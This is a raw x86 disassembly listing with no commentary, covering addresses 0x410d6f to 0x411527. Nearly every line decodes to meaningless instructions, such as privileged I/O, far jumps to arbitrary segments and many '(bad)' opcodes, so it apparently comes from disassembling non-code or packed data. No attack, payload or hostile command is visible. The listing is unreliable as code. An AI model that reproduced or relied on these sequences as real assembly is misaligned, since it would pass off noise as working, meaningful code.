  410d6f:	shl    DWORD PTR [ebx-0x57c959d9],cl
  410d75:	push   esi
  410d76:	cmp    BYTE PTR [eax],bh
  410d78:	mov    ebx,ds
  410d7a:	cmp    edx,edx
  410d7c:	inc    esi
  410d7d:	add    BYTE PTR [ebx],dh
  410d7f:	or     BYTE PTR ds:0xf63f979b,bh
  410d85:	and    DWORD PTR [edi],ebx
  410d87:	mov    dh,0x30
  410d89:	jge    0x410de5
  410d8b:	push   cs
  410d8c:	add    esp,DWORD PTR ds:0xe77f0bdc
  410d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d93:	lea    ebx,[edx]
  410d95:	fisttp WORD PTR [edx]
  410d97:	adc    ebp,DWORD PTR [ebp-0x75643161]
  410d9d:	repz cmp eax,edi
  410da0:	pop    es
  410da1:	imul   BYTE PTR [ebx]
  410da3:	pop    es
  410da4:	dec    esp
  410da5:	sti    
  410da6:	sub    DWORD PTR [esi],edi
  410da8:	jge    0x410d4d
  410daa:	xchg   ebx,eax
  410dab:	xchg   esp,eax
  410dac:	rol    BYTE PTR [eax-0x2dc89eca],0xba
  410db3:	test   BYTE PTR [ebx-0x1de5cd67],al
  410db9:	retf   
  410dba:	push   0x1eb35d6a
  410dbf:	jle    0x410de3
  410dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dc2:	xor    bh,BYTE PTR [eax-0x55eb03cb]
  410dc8:	sbb    ebp,DWORD PTR [ecx+esi*1+0x29b39261]
  410dcf:	aaa    
  410dd0:	rcr    edx,cl
  410dd2:	cmp    ah,BYTE PTR [esi]
  410dd4:	or     ah,al
  410dd6:	and    al,0x81
  410dd8:	repnz std 
  410dda:	sub    eax,DWORD PTR [eax+0x2e]
  410ddd:	sbb    edx,DWORD PTR [eax+0x5f54a671]
  410de3:	inc    esi
  410de4:	das    
  410de5:	ffree  st(1)
  410de7:	mov    BYTE PTR [edi],bh
  410de9:	pop    eax
  410dea:	js     0x410dfb
  410dec:	push   ecx
  410ded:	int    0x67
  410def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410df0:	shr    DWORD PTR [ecx+ebx*8-0x59],0xbf
  410df5:	jb     0x410da3
  410df7:	pop    ds
  410df8:	mov    ds,WORD PTR [eax+0x5044d30e]
  410dfe:	es mov dh,0xff
  410e01:	sub    eax,DWORD PTR [edx-0x31]
  410e04:	mov    ebx,DWORD PTR gs:[edi-0x4b]
  410e08:	nop
  410e09:	cli    
  410e0a:	rol    BYTE PTR [ebx],1
  410e0c:	outs   dx,DWORD PTR ds:[esi]
  410e0d:	repz test DWORD PTR [ebp+0x57],edx
  410e11:	jo     0x410d9f
  410e13:	sahf   
  410e14:	sub    DWORD PTR [ecx+0x7],eax
  410e17:	mov    WORD PTR [bp+0x27ce],ss
  410e1c:	ins    BYTE PTR es:[edi],dx
  410e1d:	sub    ecx,ecx
  410e1f:	add    BYTE PTR [edx+0x25],0x5d
  410e23:	dec    ecx
  410e24:	das    
  410e25:	jp     0x410e0c
  410e27:	in     eax,dx
  410e28:	call   0xe128e0d6
  410e2d:	int3   
  410e2e:	scas   eax,DWORD PTR es:[edi]
  410e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e30:	xlat   BYTE PTR ds:[ebx]
  410e31:	fs mov dl,0x5d
  410e34:	aad    0x43
  410e36:	push   cs
  410e37:	add    eax,0xf6502c3a
  410e3c:	jle    0x410def
  410e3e:	pop    ecx
  410e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e40:	lds    edi,FWORD PTR [bp+di+0x32]
  410e44:	xchg   edi,eax
  410e45:	cmp    BYTE PTR [ecx+0x66057139],cl
  410e4b:	adc    DWORD PTR [eax],ebx
  410e4d:	add    al,BYTE PTR [edx]
  410e4f:	pushf  
  410e50:	loop   0x410ded
  410e52:	(bad)  
  410e54:	out    0xa4,al
  410e56:	mov    ch,0x2b
  410e58:	arpl   WORD PTR [esi+eiz*2+0x473ab415],cx
  410e5f:	add    BYTE PTR ds:0x366eb630,al
  410e65:	(bad)  
  410e66:	dec    esi
  410e67:	mov    ah,0x18
  410e69:	in     al,0x61
  410e6b:	fwait
  410e6c:	cmp    BYTE PTR [esi],dl
  410e6e:	mov    ds:0x75cf0b98,eax
  410e73:	lds    esi,FWORD PTR [edi]
  410e75:	jno    0x410e5d
  410e77:	ror    DWORD PTR [esi+0x27745db4],cl
  410e7d:	pop    edx
  410e7e:	retf   0x1de7
  410e81:	sub    eax,DWORD PTR [ebp+0x3a]
  410e84:	inc    esp
  410e85:	call   0x9bae:0x230b56ba
  410e8c:	add    DWORD PTR [eax+0x15bc3c7f],ecx
  410e92:	sahf   
  410e93:	jns    0x410ee4
  410e95:	pop    ss
  410e96:	inc    eax
  410e97:	cmp    esp,DWORD PTR [esi+0x67]
  410e9a:	dec    esp
  410e9b:	les    eax,FWORD PTR [ecx+0x1869dab5]
  410ea1:	sahf   
  410ea2:	jns    0x410e27
  410ea4:	hlt    
  410ea5:	or     ch,BYTE PTR [ebx+0x3f648b35]
  410eab:	ja     0x410ef5
  410ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eae:	and    DWORD PTR [edi+0x4f],ecx
  410eb1:	sbb    bl,BYTE PTR [ebx+0x9fbd2e7]
  410eb7:	mov    bl,0x8
  410eb9:	std    
  410eba:	xlat   BYTE PTR ds:[ebx]
  410ebb:	xor    eax,0x8b362909
  410ec0:	xchg   esp,eax
  410ec1:	call   0xe523720d
  410ec6:	mov    ch,ch
  410ec8:	mov    al,BYTE PTR ds:0xd037db18
  410ece:	push   0x3dcf8ad3
  410ed3:	sbb    cl,BYTE PTR [ebx+0xe]
  410ed6:	sub    DWORD PTR [edi-0xb],esp
  410ed9:	adc    al,BYTE PTR [ecx+eiz*1+0x4e]
  410edd:	ds xor eax,ecx
  410ee0:	in     al,0x51
  410ee2:	data16 int3 
  410ee4:	loope  0x410f05
  410ee6:	(bad)  
  410ee8:	pop    edi
  410ee9:	or     DWORD PTR [esi-0x55d5ed2e],esp
  410eef:	das    
  410ef0:	cdq    
  410ef1:	pop    ecx
  410ef2:	push   ecx
  410ef3:	shl    edx,1
  410ef5:	jmp    0xeb6c:0xe6c5a60a
  410efc:	ss push eax
  410efe:	xchg   ecx,eax
  410eff:	ds cli 
  410f01:	dec    ebx
  410f02:	out    dx,al
  410f03:	stos   DWORD PTR es:[edi],eax
  410f04:	sub    DWORD PTR [ebp-0x17],ebx
  410f07:	js     0x410ecd
  410f09:	sbb    eax,0x3f77352d
  410f0e:	cmp    BYTE PTR [edi-0x5a],dl
  410f11:	sbb    DWORD PTR [ebp+0x7d38584b],ebx
  410f17:	add    eax,0x1bf3b7d5
  410f1c:	dec    edx
  410f1d:	daa    
  410f1e:	xor    dx,WORD PTR [ebx+0x35]
  410f22:	add    eax,0xf6455e99
  410f27:	jmp    0x410f05
  410f29:	out    0x6c,al
  410f2b:	das    
  410f2c:	adc    al,0x59
  410f2e:	jge    0x410ec7
  410f30:	xor    DWORD PTR [bp+di],eax
  410f33:	les    ecx,FWORD PTR [ecx+0x53]
  410f36:	xor    eax,DWORD PTR [ebx]
  410f38:	cmp    dl,cl
  410f3a:	out    0x13,al
  410f3c:	je     0x410f41
  410f3e:	addr16 nop
  410f40:	mov    cl,0xbb
  410f42:	std    
  410f43:	and    BYTE PTR [edi],cl
  410f45:	cdq    
  410f46:	scas   eax,DWORD PTR es:[edi]
  410f47:	fst    DWORD PTR [eax+0x19]
  410f4a:	mov    ch,0x1f
  410f4c:	or     BYTE PTR [edi+ebp*4+0x3e94804c],0xee
  410f54:	xchg   DWORD PTR [ebx],ebx
  410f56:	cmp    DWORD PTR [ecx],ebx
  410f58:	xchg   esi,eax
  410f59:	es mov edi,0x67c7f6e0
  410f5f:	fcmovnb st,st(0)
  410f61:	push   ecx
  410f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f63:	dec    esp
  410f64:	ss mov ah,0x21
  410f67:	sub    ch,BYTE PTR [eax+ebx*4]
  410f6a:	ja     0x410f1a
  410f6c:	pop    ds
  410f6d:	and    al,0xe9
  410f6f:	xchg   ecx,eax
  410f70:	adc    DWORD PTR [ecx+0x4c],0xe8e900b2
  410f77:	and    BYTE PTR [edx+0x7a16b8fb],bl
  410f7d:	push   ecx
  410f7e:	sar    DWORD PTR [ebx],0xf0
  410f81:	push   ebx
  410f82:	add    al,0x1
  410f84:	mov    fs,ecx
  410f86:	push   edi
  410f87:	stos   DWORD PTR es:[edi],eax
  410f88:	dec    esp
  410f89:	pop    esp
  410f8a:	std    
  410f8b:	test   DWORD PTR [ebx-0x32],edx
  410f8e:	test   DWORD PTR [ecx-0x50],0xbfd83eeb
  410f95:	fwait
  410f96:	adc    al,0x1c
  410f98:	shr    DWORD PTR [ebp+0x1],cl
  410f9b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  410f9d:	or     eax,0x2642f00
  410fa2:	rcl    DWORD PTR [eax+0x2b],1
  410fa5:	jnp    0x410f31
  410fa7:	jmp    0xd6f0a3e9
  410fac:	ret    
  410fad:	bound  esp,QWORD PTR [edi]
  410faf:	and    eax,0x57
  410fb2:	out    dx,eax
  410fb3:	je     0x410fe4
  410fb5:	xchg   esp,eax
  410fb6:	ins    BYTE PTR es:[edi],dx
  410fb7:	out    dx,eax
  410fb8:	(bad)  
  410fb9:	gs in  eax,0xf5
  410fbc:	or     ch,al
  410fbe:	ja     0x410f96
  410fc0:	call   0xf97a:0x83d30b8d
  410fc7:	pop    ebx
  410fc8:	push   eax
  410fc9:	js     0x410f69
  410fcb:	lock and eax,0xd7f3a211
  410fd1:	cmp    dh,ah
  410fd3:	dec    edx
  410fd4:	ins    BYTE PTR es:[edi],dx
  410fd5:	sub    bh,BYTE PTR [eax-0x7c1606fd]
  410fdb:	add    al,BYTE PTR [eax]
  410fdd:	add    ah,cl
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	retw   0x46f6
  410fed:	icebp  
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	mov    cs,WORD PTR [edi+0xb3d4437]
  410ffc:	rcr    BYTE PTR [ebx+0x8],1
  410fff:	scas   eax,DWORD PTR es:[edi]
  411000:	ret    
  411001:	js     0x410fb0
  411003:	repnz clc 
  411005:	fstp   TBYTE PTR gs:[esi-0x4c]
  411009:	(bad)  
  41100a:	mov    ch,0x4b
  41100c:	scas   eax,DWORD PTR es:[edi]
  41100d:	push   eax
  41100e:	and    al,0x2c
  411010:	fdivp  st(3),st
  411012:	sbb    esi,esi
  411014:	jmp    0x74041e86
  411019:	sbb    ecx,DWORD PTR [eax+0x79b3f5cf]
  41101f:	mov    al,0xc1
  411021:	xor    al,0xa1
  411023:	call   0x5b1725a6
  411028:	(bad)  
  411029:	retf   
  41102a:	inc    edi
  41102b:	daa    
  41102c:	and    dh,ch
  41102e:	cdq    
  41102f:	imul   ecx,DWORD PTR [esi],0x5a
  411032:	sub    ebp,esp
  411034:	shl    BYTE PTR [ecx],0x46
  411037:	push   cs
  411038:	mov    esi,ecx
  41103a:	ret    
  41103b:	sahf   
  41103c:	loope  0x411035
  41103e:	xchg   ecx,eax
  41103f:	dec    esp
  411040:	mov    al,0xb
  411042:	shl    BYTE PTR [edi+0x5c],0x3f
  411046:	pop    esi
  411047:	and    BYTE PTR [edx],bh
  411049:	frstor [edi-0x26]
  41104c:	test   BYTE PTR [edi+0x684cf90],bl
  411052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411053:	jmp    edi
  411055:	jno    0x411063
  411057:	xchg   DWORD PTR ds:0x67b6925,esp
  41105d:	jnp    0x41101e
  41105f:	outs   dx,BYTE PTR ds:[esi]
  411060:	loopne 0x4110cd
  411062:	rcr    DWORD PTR [esi-0x4b],cl
  411065:	fnstcw WORD PTR [edi-0x5d]
  411068:	adc    BYTE PTR [eax],bl
  41106a:	das    
  41106b:	in     eax,dx
  41106c:	mov    ds:0xd3d91ed4,al
  411071:	add    edi,DWORD PTR [ebx+0x3a]
  411074:	outs   dx,DWORD PTR ds:[esi]
  411075:	mov    ah,0xfe
  411077:	ror    DWORD PTR [esi-0x2aa4ce43],1
  41107d:	mov    ebp,0x29b82235
  411082:	jle    0x411094
  411084:	iret   
  411085:	and    cl,BYTE PTR [edx-0xc7df3c7]
  41108b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108c:	mov    eax,DWORD PTR [edi]
  41108e:	push   esp
  41108f:	fbstp  TBYTE PTR [ebx-0x50]
  411092:	mov    edx,0xcc4f682f
  411097:	mov    esi,0xf0feb383
  41109c:	jmp    0x4110d8
  41109e:	push   esi
  41109f:	test   al,0x94
  4110a1:	or     BYTE PTR [ecx-0x1671b5e],0x49
  4110a8:	lods   eax,DWORD PTR ds:[esi]
  4110a9:	out    0x6a,eax
  4110ab:	sbb    al,0x8e
  4110ad:	sub    bl,BYTE PTR [esi-0x684c7471]
  4110b3:	popa   
  4110b4:	and    al,0xe1
  4110b6:	stc    
  4110b7:	push   es
  4110b8:	cmp    eax,0x552eeefb
  4110bd:	sub    BYTE PTR ds:0x7f3bbbe,bh
  4110c3:	fldcw  WORD PTR [eax+0x23]
  4110c6:	imul   edx,DWORD PTR [edx],0xa9c4b6c7
  4110cc:	jp     0x411095
  4110ce:	pop    eax
  4110cf:	xor    eax,0x85981670
  4110d4:	(bad)  
  4110d5:	sbb    al,0x86
  4110d7:	jmp    0x41108c
  4110d9:	arpl   WORD PTR [edx-0x1],dx
  4110dc:	sub    eax,DWORD PTR ds:0x5f5cf704
  4110e2:	fwait
  4110e3:	retf   0x3ab
  4110e6:	retf   0x3a59
  4110e9:	or     eax,0x193dee83
  4110ee:	fdiv   QWORD PTR [edi+0x26]
  4110f1:	adc    al,0xe7
  4110f3:	scas   al,BYTE PTR es:[edi]
  4110f4:	mov    ecx,DWORD PTR [edi-0x5f]
  4110f7:	xchg   esi,eax
  4110f8:	(bad)  
  4110f9:	int3   
  4110fa:	test   BYTE PTR [esi],0x79
  4110fd:	fimul  DWORD PTR [ebp+0x4d477cd9]
  411103:	adc    eax,0x1fc05958
  411108:	sahf   
  411109:	xchg   edx,eax
  41110a:	push   0xfa24cfc1
  41110f:	mov    cl,0x4
  411111:	fst    DWORD PTR ds:0x8d7e5aa2
  411117:	inc    esi
  411118:	jmp    0x4d32:0xca10c51f
  41111f:	mov    ebx,0xce44caa8
  411124:	xchg   ecx,eax
  411125:	popa   
  411126:	scas   al,BYTE PTR es:[edi]
  411127:	and    bl,bh
  411129:	mov    bl,0xac
  41112b:	push   esp
  41112c:	dec    esp
  41112d:	xor    al,0x6
  41112f:	push   edx
  411130:	out    0x6c,eax
  411132:	stc    
  411133:	cmp    al,0xac
  411135:	mov    dh,0x6c
  411137:	dec    edi
  411138:	lock mov WORD PTR [edi-0x27],ds
  41113c:	adc    edi,DWORD PTR [ebx+0x5b]
  41113f:	inc    esi
  411140:	test   BYTE PTR [ecx],bl
  411142:	fidiv  WORD PTR [esi+esi*1]
  411145:	in     eax,0xe5
  411147:	jbe    0x4111c3
  411149:	hlt    
  41114a:	mov    DWORD PTR [eax],0x9a681e0
  411150:	test   ecx,ecx
  411152:	inc    edx
  411153:	jg     0x4111c6
  411155:	sub    bl,ch
  411157:	xchg   esi,eax
  411158:	test   ch,cl
  41115a:	jne    0x411112
  41115c:	push   0x4
  41115e:	xor    edi,eax
  411160:	test   eax,0x8b8a03e5
  411165:	call   0xad81:0x8349b6d4
  41116c:	inc    edi
  41116d:	jbe    0x4111b4
  41116f:	jb     0x411170
  411171:	aam    0x25
  411173:	popf   
  411174:	shr    BYTE PTR [edx+0x71],cl
  411177:	add    eax,DWORD PTR [edi-0x66]
  41117a:	mov    eax,0xd70031f0
  41117f:	pop    ebp
  411180:	ins    DWORD PTR es:[edi],dx
  411181:	xor    DWORD PTR [edx-0x76cd068f],0xc3f62dcd
  41118b:	sbb    BYTE PTR [ebp+0x645fb27d],ah
  411191:	dec    esi
  411192:	lods   al,BYTE PTR ds:[esi]
  411193:	fnstenv ds:[esi]
  411196:	fwait
  411197:	mov    bl,BYTE PTR [edi]
  411199:	and    al,0x91
  41119b:	call   0xe738:0x7e1049ba
  4111a2:	pop    ecx
  4111a3:	test   BYTE PTR [ecx+edx*4],dl
  4111a6:	dec    ecx
  4111a7:	gs xchg ecx,eax
  4111a9:	push   0x3
  4111ab:	push   edi
  4111ac:	sbb    eax,0x2c3b5e39
  4111b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b2:	lods   eax,DWORD PTR ds:[esi]
  4111b3:	push   ebp
  4111b4:	push   edi
  4111b5:	in     eax,dx
  4111b6:	xchg   ecx,eax
  4111b7:	(bad)  
  4111b8:	out    dx,al
  4111b9:	(bad)
  4111bd:	ss jl  0x411218
  4111c0:	fidivr DWORD PTR [ebp-0x4902b78a]
  4111c6:	adc    edx,DWORD PTR [ecx-0x3dcb7b42]
  4111cc:	adc    al,0xd4
  4111ce:	pop    ds
  4111cf:	mov    edi,0x70398ac6
  4111d4:	scas   eax,DWORD PTR es:[edi]
  4111d5:	mov    WORD PTR [edi+ecx*8-0x2ed2c55d],ds
  4111dc:	or     cl,bl
  4111de:	arpl   WORD PTR [eax+0x13eba301],bx
  4111e4:	xchg   BYTE PTR [esi+ebp*2-0x18],dl
  4111e8:	jmp    0x7538:0x59da35bc
  4111ef:	jl     0x4111eb
  4111f1:	pop    eax
  4111f2:	fwait
  4111f3:	std    
  4111f4:	xchg   ch,dl
  4111f6:	jbe    0x411197
  4111f8:	mul    BYTE PTR [edi-0x65]
  4111fb:	add    bl,BYTE PTR [esi+0x7a]
  4111fe:	popa   
  4111ff:	mov    esp,0xe67f8c60
  411204:	(bad)  
  411206:	bound  esi,QWORD PTR [bp+si-0x332a]
  41120b:	xor    esi,edi
  41120d:	adc    BYTE PTR [edi-0x1b],bl
  411210:	or     ecx,eax
  411212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411213:	mov    edx,DWORD PTR [ebx+0x55e5fbc0]
  411219:	ins    BYTE PTR es:[edi],dx
  41121a:	int    0xd7
  41121c:	xchg   edx,eax
  41121d:	mov    eax,0xf3047206
  411222:	fs push 0xffffffcb
  411225:	adc    eax,0x4bc7cda3
  41122a:	jecxz  0x4111f5
  41122c:	dec    eax
  41122d:	or     ebp,eax
  41122f:	sub    bh,bl
  411231:	scas   al,BYTE PTR es:[edi]
  411232:	jae    0x41126c
  411234:	jge    0x411212
  411236:	mov    ds:0xd88d748e,al
  41123b:	pop    ds
  41123c:	les    esp,FWORD PTR [esi]
  41123e:	ror    DWORD PTR [esi-0x4e3eeef0],0x43
  411245:	out    dx,eax
  411246:	std    
  411247:	dec    ecx
  411248:	fstp   st(0)
  41124a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41124b:	icebp  
  41124c:	and    edi,ecx
  41124e:	fadd   QWORD PTR [edx]
  411250:	pushf  
  411251:	lock lds esp,FWORD PTR [eax]
  411254:	push   ss
  411255:	mov    WORD PTR ds:0x1df41a2,cs
  41125b:	add    cl,BYTE PTR [edi+ecx*1+0x30a3cf7]
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x7e],al
  411278:	cwde   
  411279:	outs   dx,DWORD PTR ds:[esi]
  41127a:	pop    eax
  41127b:	rcr    BYTE PTR [edi+0x78],cl
  41127e:	js     0x411265
  411280:	jle    0x4112fa
  411282:	js     0x4112da
  411284:	adc    dh,BYTE PTR [ebp-0x9]
  411287:	adc    BYTE PTR [ebx],ch
  411289:	pushf  
  41128a:	das    
  41128b:	daa    
  41128c:	fld    TBYTE PTR [edx-0x33edb111]
  411292:	or     bl,BYTE PTR [eax+ecx*1]
  411295:	mov    ebp,0x4b11759a
  41129a:	push   es
  41129b:	or     BYTE PTR [esi],dh
  41129d:	mov    edx,0x3577e298
  4112a2:	jge    0x4112df
  4112a4:	fwait
  4112a5:	aaa    
  4112a6:	ins    BYTE PTR es:[edi],dx
  4112a7:	pushf  
  4112a8:	inc    BYTE PTR [edi-0x3d]
  4112ab:	dec    ebx
  4112ac:	push   ecx
  4112ad:	mov    cs,WORD PTR [edi]
  4112af:	push   esi
  4112b0:	stos   DWORD PTR es:[edi],eax
  4112b1:	xchg   ebx,eax
  4112b2:	fsubr  DWORD PTR [ebx]
  4112b4:	cmp    cl,dl
  4112b6:	xchg   esi,eax
  4112b7:	jecxz  0x41129a
  4112b9:	mov    esp,0x373c9a9f
  4112be:	pusha  
  4112bf:	adc    eax,0x85ac4708
  4112c4:	push   ss
  4112c5:	jmp    0x3192185d
  4112ca:	enter  0xb55b,0x35
  4112ce:	ja     0x4112db
  4112d0:	push   0x60
  4112d2:	adc    esp,eax
  4112d4:	sbb    ebp,DWORD PTR gs:[ecx]
  4112d7:	xor    DWORD PTR ds:0xe49d0981,0x81f371e
  4112e1:	sub    esi,ebx
  4112e3:	sbb    ch,BYTE PTR [ebx+0x474ed978]
  4112e9:	inc    ecx
  4112ea:	xchg   esp,eax
  4112eb:	(bad)  [edi]
  4112ed:	mov    eax,0x33c41ad9
  4112f2:	pop    eax
  4112f3:	mov    ecx,0x7f409695
  4112f8:	sbb    DWORD PTR [edi+0x104127e5],0x600dd369
  411302:	rol    DWORD PTR [esi],0xba
  411305:	pushf  
  411306:	sub    cl,dl
  411308:	fst    QWORD PTR [ebp+0x4b3112c3]
  41130e:	div    DWORD PTR [esi*1-0x240e992e]
  411315:	jp     0x4112b7
  411317:	jmp    0x15aa:0xc650c10c
  41131e:	stos   DWORD PTR es:[edi],eax
  41131f:	lahf   
  411320:	xchg   DWORD PTR [eax-0x6d2a2abf],ebx
  411326:	test   cl,ah
  411328:	mov    ah,0x1
  41132a:	inc    ecx
  41132b:	cmc    
  41132c:	adc    al,0x48
  41132e:	fisttp QWORD PTR [edi+edi*4+0x28570faa]
  411335:	sub    al,0xc4
  411337:	mov    al,0xd9
  411339:	add    edx,DWORD PTR [edx-0x39]
  41133c:	push   esi
  41133d:	jmp    0x975143ff
  411342:	add    eax,0x4fde8d0f
  411347:	xchg   esp,eax
  411348:	int    0xad
  41134a:	retf   0xab2
  41134d:	mov    BYTE PTR [eax+0x1df99b35],dh
  411353:	lods   eax,DWORD PTR ds:[esi]
  411354:	jp     0x41137d
  411356:	xchg   BYTE PTR [esi-0xf],ch
  411359:	mov    ebx,0x4a961d6a
  41135e:	xor    eax,0x7ccd32c3
  411363:	test   BYTE PTR [edi+0x72406ab5],0xdc
  41136a:	inc    ebx
  41136b:	jno    0x411363
  41136d:	jmp    0xa0b2:0x99091e76
  411374:	xchg   esi,eax
  411375:	pop    ebp
  411376:	mov    esp,0x3f185289
  41137b:	mov    fs,eax
  41137d:	mov    bl,0xca
  41137f:	jno    0x4113f0
  411381:	mov    ch,0x4f
  411383:	push   dx
  411385:	lods   al,BYTE PTR ds:[esi]
  411386:	lock push ss
  411388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411389:	std    
  41138a:	pop    esp
  41138b:	xor    esp,edx
  41138d:	fiadd  WORD PTR ds:0x99340bf1
  411393:	cld    
  411394:	and    BYTE PTR [ecx+0x3d09c3a8],cl
  41139a:	mov    ebp,0x4f2228d
  41139f:	in     al,0xa4
  4113a1:	pop    es
  4113a2:	sbb    eax,DWORD PTR [edi+0x2b12dc7d]
  4113a8:	div    BYTE PTR [ecx-0x27]
  4113ab:	cmp    dh,BYTE PTR [esi+edx*1-0x1ff080e8]
  4113b2:	jnp    0x4113b0
  4113b4:	lds    esp,FWORD PTR [ebx+0x2f60497e]
  4113ba:	lahf   
  4113bb:	arpl   WORD PTR [edi+0x11],bp
  4113be:	mov    dl,0xe4
  4113c0:	pop    edx
  4113c1:	iret   
  4113c2:	lods   eax,DWORD PTR ds:[esi]
  4113c3:	and    edi,DWORD PTR [ecx]
  4113c5:	lahf   
  4113c6:	arpl   bp,cx
  4113c8:	call   0x63e4b63a
  4113cd:	aaa    
  4113ce:	pusha  
  4113cf:	je     0x41140a
  4113d1:	(bad)  
  4113d3:	and    eax,0xd9b17d67
  4113d8:	sar    ah,1
  4113da:	adc    esp,eax
  4113dc:	push   edx
  4113dd:	ds push ebp
  4113df:	mov    BYTE PTR [eax+0x619e433f],bl
  4113e5:	mov    edi,0xe1f4c956
  4113ea:	out    0x83,al
  4113ec:	mov    DWORD PTR [esi-0x5d84a409],ecx
  4113f2:	inc    edi
  4113f3:	(bad)  
  4113f4:	mov    ds:0x26f225ef,eax
  4113f9:	cmc    
  4113fa:	fdiv   QWORD PTR [esp+esi*1+0x4f70f933]
  411401:	aas    
  411402:	cwde   
  411403:	inc    esp
  411404:	imul   eax,DWORD PTR [ebx-0x3731b35f],0xbf6d2e79
  41140e:	mov    dl,0x81
  411410:	jb     0x411430
  411412:	sub    DWORD PTR [ecx],ecx
  411414:	mov    al,ds:0x21bae42d
  411419:	repz in eax,0xfe
  41141c:	stos   DWORD PTR es:[edi],eax
  41141d:	pop    esi
  41141e:	cld    
  41141f:	adc    DWORD PTR [eax],ebp
  411421:	fisttp DWORD PTR [ecx]
  411423:	loopne 0x411422
  411425:	push   es
  411426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411427:	push   edi
  411428:	mov    ah,0x21
  41142a:	add    DWORD PTR [edi+ecx*2+0x3a934d7b],esp
  411431:	mov    ecx,0x11e7e78
  411436:	imul   ebx,DWORD PTR [esi],0x40
  411439:	jge    0x411463
  41143b:	inc    edx
  41143c:	mov    dh,dl
  41143e:	sub    BYTE PTR [edx],0xc
  411441:	dec    esi
  411442:	inc    ecx
  411443:	sbb    BYTE PTR [ecx+0x568d191f],0x85
  41144a:	inc    esi
  41144b:	lahf   
  41144c:	pop    ds
  41144d:	fst    DWORD PTR [ebp-0xa]
  411450:	aam    0x38
  411452:	xchg   ebp,eax
  411453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411454:	in     al,dx
  411455:	lock sub eax,0xbfea2dbe
  41145b:	test   DWORD PTR [edx-0x27],esp
  41145e:	jmp    0x411487
  411460:	mov    eax,ds:0x22f094
  411465:	in     eax,dx
  411466:	jno    0x411412
  411468:	xor    al,0x52
  41146a:	inc    ebp
  41146b:	or     eax,0x996e04ce
  411470:	cmp    BYTE PTR [edi+edi*2-0x3e],ch
  411474:	gs gs inc esi
  411477:	adc    al,0xa9
  411479:	into   
  41147a:	iret   
  41147b:	push   ds
  41147c:	inc    edi
  41147d:	xchg   eax,ebp
  41147f:	retf   
  411480:	xchg   ebp,eax
  411481:	int3   
  411482:	xchg   ebx,eax
  411483:	repnz mov ch,0x65
  411486:	repnz out dx,eax
  411488:	sub    DWORD PTR [ebp-0xf],0x13
  41148c:	lods   al,BYTE PTR ds:[esi]
  41148d:	lock fdivr QWORD PTR [eax+0x6e1ce1a9]
  411494:	jle    0x411440
  411496:	and    DWORD PTR [ebx],esi
  411498:	mov    ebp,0xf87ffb0c
  41149d:	jge    0x4114e3
  41149f:	outs   dx,DWORD PTR ds:[esi]
  4114a0:	das    
  4114a1:	mov    dl,0xaf
  4114a3:	add    BYTE PTR [ecx-0x6773fbc5],al
  4114a9:	call   0xb887:0x869ccf86
  4114b0:	icebp  
  4114b1:	jmp    0xb5fddae
  4114b6:	mov    WORD PTR [ebp-0x1e1bd5c3],ss
  4114bc:	ja     0x4114ed
  4114be:	fcomp  DWORD PTR [ecx-0x413609a5]
  4114c4:	mov    ch,0x25
  4114c6:	cmp    ecx,ebp
  4114c8:	sub    bh,cl
  4114ca:	jo     0x4114f8
  4114cc:	ds lds edi,FWORD PTR ds:[edx-0x55]
  4114d1:	add    eax,ebp
  4114d3:	inc    edi
  4114d4:	fisttp WORD PTR [edx+0x59]
  4114d7:	pop    eax
  4114d8:	and    al,0x95
  4114da:	adc    al,0xe2
  4114dc:	jne    0x4114b4
  4114de:	out    0x22,eax
  4114e0:	inc    ebx
  4114e1:	rol    eax,cl
  4114e3:	inc    ebp
  4114e4:	jnp    0x4114d3
  4114e6:	ins    DWORD PTR es:[edi],dx
  4114e7:	(bad)  
  4114e9:	icebp  
  4114ea:	sbb    ecx,DWORD PTR [edx]
  4114ec:	pop    edx
  4114ed:	stos   DWORD PTR es:[edi],eax
  4114ee:	mov    edi,DWORD PTR [ebp-0x8]
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	sti    
  411510:	das    
  411511:	icebp  
  411512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411513:	mov    edi,0xe578785d
  411518:	jle    0x411592
  41151a:	js     0x4114b5
  41151c:	clc    
  41151d:	add    DWORD PTR [edi],ebx
  41151f:	dec    ecx
  411520:	add    eax,0x9dcbd4cd
  411525:	cdq    
  411526:	in     al,dx
  411527:	lods   eax,DWORD PTR ds:[esi]
